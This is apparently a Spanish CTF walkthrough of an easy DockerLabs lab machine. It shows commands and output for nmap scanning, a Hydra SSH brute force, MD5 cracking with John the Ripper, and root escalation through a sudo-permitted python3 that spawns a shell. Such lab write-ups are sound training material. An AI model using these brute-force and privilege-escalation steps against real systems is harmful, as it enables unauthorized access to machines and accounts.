Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #criptografia #dockerlabs 

![](assets/Pasted%20image%2020251103001103.png)

## Reconocimiento

Comenzamos lanzando un nmap para ver todos los puertos abiertos:

```bash
> nmap -p- --open --min-rate 5000 -sS -Pn -n 172.17.0.2 -oN ports.txt
---------------------------------------------------------------------
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

- Puertos 22 y 80 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> sudo nmap -p 22,80 --min-rate 5000 -sS -sCV -Pn -n 172.17.0.2 -oN targeted.txt
---------------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 9e:10:58:a5:1a:42:9d:be:e5:19:d1:2e:79:9c:ce:21 (ECDSA)
|_  256 6b:a3:a8:84:e0:33:57:fc:44:49:69:41:7d:d3:c9:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
```

**Puerto 80 HTTP**

- Se nos indica encontrar la contraseña del usuario **`a`**, lo que indica claramente que el objetivo inicial será obtener acceso al servicio **SSH**.

![](assets/Pasted%20image%2020251102225050.png)

## Explotación

Con la pista obtenida, procedemos a realizar un ataque de **fuerza bruta** contra el servicio SSH utilizando **Hydra**, limitando el ataque únicamente al usuario `a`:

```bash
> hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 15
-----------------------------------------------------------------------
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: a   password: secret
1 of 1 target successfully completed, 1 valid password found
```

- Credenciales encontradas a:secret para el ssh

Nos conectamos port ssh con el usuario _a_

```bash
> ssh a@172.17.0.2
```

Una vez dentro del sistema, realizamos una enumeración básica de directorios. No encontramos información relevante en el directorio personal del usuario, por lo que decidimos inspeccionar la ruta **`/srv`**, ya que suele contener recursos adicionales.

- Dentro de **`/srv/ftp`** encontramos múltiples archivos relacionados con **criptografía**, lo que concuerda con la temática del laboratorio:

```bash
a@1f72134edab5:/srv/ftp$ ls                                                        
cifrado_aes.enc    clave_publica.pem  mensaje_hash.txt  pista_fuerza_bruta.txt
clave_aes.txt      hash_a.txt         mensaje_rsa.enc   retos.txt
clave_privada.pem  hash_spencer.txt   original_a.txt    retos_asimetrico.txt
```

Para analizarlos con mayor comodidad, descargamos todos los archivos a nuestra máquina local:

```bash
> scp a@172.17.0.2:/srv/ftp/* ~/Desktop/
```

## Análisis de retos criptográficos

### Cifrado Simetrico.

El archivo **`retos.txt`** nos indica el primer desafío:
```bash
> cat retos.txt
Cifrado Simétrico: Usa AES para desencriptar el siguiente archivo.
```

- Se nos pide descifrar un archivo utilizando **AES**.

Usando la clave proporcionada en **`clave_aes.txt`**, procedemos a descifrar el archivo correspondiente:

```bash
> openssl enc -d -aes-128-cbc -in cifrado_aes.enc -out desencriptado_aes.txt -k thisisaverysecretkey!
```

Al revisar el contenido, observamos que no aporta información útil para continuar con el reto:

```bash
> cat desencriptado_aes.txt
Texto original: Hola 
```

### Cifrado Asimétrico

El siguiente archivo de interés es **`retos_asimetrico.txt`**, que nos introduce a un cifrado asimétrico:

```bash
> cat retos_asimetrico.txt
Cifrado Asimétrico: Encuentra la clave privada para desencriptar.
```

Utilizando la clave privada proporcionada, procedemos a descifrar el mensaje RSA:

```bash
> openssl pkeyutl -decrypt -in mensaje_rsa.enc -out desencriptado_rsa.txt -inkey clave_privada.pem
```

Al igual que el anterior, el contenido no resulta relevante:

```bash
> cat desencriptado_rsa.txt
Texto original: Hola A!
```

#### Hashes

El archivo **`mensaje_hash.txt`** nos da la siguiente pista:

```bash
> cat mensaje_hash.txt 
-------------------------------------
Descubre el hash y tendrás la clave...
```

Esto nos lleva a analizar el archivo **`hash_spencer.txt`**:

```bash
> cat hash_spencer.txt
-------------------------
7c6a180b36896a0a8c02787eeaf
```

- El nombre sugiere que **`spencer`** es un usuario válido del sistema.
- El formato del hash corresponde a **MD5**.

Procedemos a romper el hash utilizando **John the Ripper**:

- Contraseña encontrada _password1

```bash
> sudo john --format=raw-md5 hash_spencer.txt
---------------------------------------------
Proceeding with wordlist:/usr/share/john/password.lst
password1        (?)    
```

Nos conectamos por ssh con las siguientes credenciales

- spencer:password1

```bash
> ssh spencer@172.17.0.2
```


## Escalada de Privilegios

Lo primero que hacemos es enumerar binarios que puedan ser ejecutado como `root`.

```bash
> spencer@1f72134edab5:~$ sudo -l
---------------------------------
User spencer may run the following commands on 1f72134edab5:
    (ALL) NOPASSWD: /usr/bin/python3
```

- Podemos ejecutar python como cualquier usuario sin necesidad de contraseña

Ejecutamos python como root:

```bash
> spencer@1f72134edab5:~$ sudo -u root /usr/bin/python3 
```

Dentro del REPL de python procedí a importar el modulo `os` y spawnear una bash.

```python
>>> import os
>>> os.system("/bin/bash")
root@1f72134edab5:/home/spencer# whoami
root
```

***PWNED***